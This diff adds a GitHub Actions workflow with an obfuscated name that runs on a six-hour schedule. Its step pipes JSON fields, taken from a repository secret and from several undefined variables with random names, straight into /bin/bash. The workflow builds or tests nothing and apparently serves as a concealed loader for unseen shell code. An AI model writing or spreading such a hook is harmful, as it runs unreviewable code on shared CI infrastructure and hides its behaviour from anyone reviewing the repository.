@@ -1,0 +1,24 @@
+name: xueqianzhihouyan
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '57 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xueqianzhihouyan
+        env:
+          fdv7: ${{ secrets.fdv7 }}
+        run: |
+          echo $fdv7 | jq -r .jh9 | /bin/bash
+          echo $s20824 | jq -r .shz13 | /bin/bash
+          echo $h0794 | jq -r .g32 | /bin/bash
+          echo $vjvqo8942 | jq -r .fotb53 | /bin/bash
+          echo $dijj0 | jq -r .uor08 | /bin/bash
+          echo $uwwk11 | jq -r .vj39333 | /bin/bash
+
